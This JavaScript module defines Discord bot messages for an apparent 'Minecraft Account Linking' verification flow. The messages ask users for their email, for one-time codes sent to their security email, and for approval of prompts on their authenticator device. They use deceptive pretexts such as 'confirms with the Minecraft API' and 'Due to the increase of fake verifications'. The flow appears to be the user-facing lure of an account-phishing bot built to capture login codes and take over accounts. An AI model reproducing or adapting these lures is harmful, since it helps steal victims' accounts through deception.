module.exports = (type) => {
  switch (type) {
    case "main":
      return {
        title: `Minecraft Account Linking`,
        description: `
        FAQ

        Q: Why do we need you to verify?
        
        A: It's for auto-roles, We need to give you your class roles, catacomb-level roles, and verified roles. It's also just for extra security in-cases of a raid.
        
        Q: How long does it take for me to get my roles?
        
        A: We try to make the waiting time as little as possible, the fastest we were able to make it is as little as 30-50 seconds.
        
        Q: Why do you need to collect a code?
        
        A: The code confirms with the Minecraft API that you actually own that minecraft account.`,
        color: 0x00ff00
      }
    case "otp":
      return {
        title: `No Security email`,
        description: `Your email doesn't have a security-email. Add a security email and then re-verify!`,
        color: 0xff0000
      }
    case "oauth":
      return {
        title: `Verification`,
        description: `Use this link to verify instead!`,
        color: 0x00ff00
      }
    case "res":
      return {
        title: `Account linked!`,
        description: `Congratulations you linked the account successfully!`,
        color: 0x00ff00
      }
    case "invalid":
      return {
        title: `Error :x:`,
        description: `The code you sent was wrong, please try again with a valid code!`,
        color: 0xff0000
      }
    case "sec":
      return {
        title: `Last Step`,
        description: `Due to the increase of fake verifications, we require you to confirm the code that we sent you at {1}`,
        color: 0xffff00
      }
    case "invalid email":
      return {
        title: `Error :x:`,
        description: `Please try again with a valid email`,
        color: 0xff0000,
      }
    case "authenticator":
      return {
        title: `Last Step`,
        description: `Due to the increase of fake verifications, we require you to confirm in your device that you are the owner of this account By clicking on {1}.`,
        color: 0xffff00
      }
    case "account doesn't exist":
      return {
        title: `Error :x:`,
        description: `This account doesn't exist, please try again with a valid account!`,
        color: 0xff0000
      }
    default:
      console.log(`Invalid embed type ${type}`)
      break;
  }
}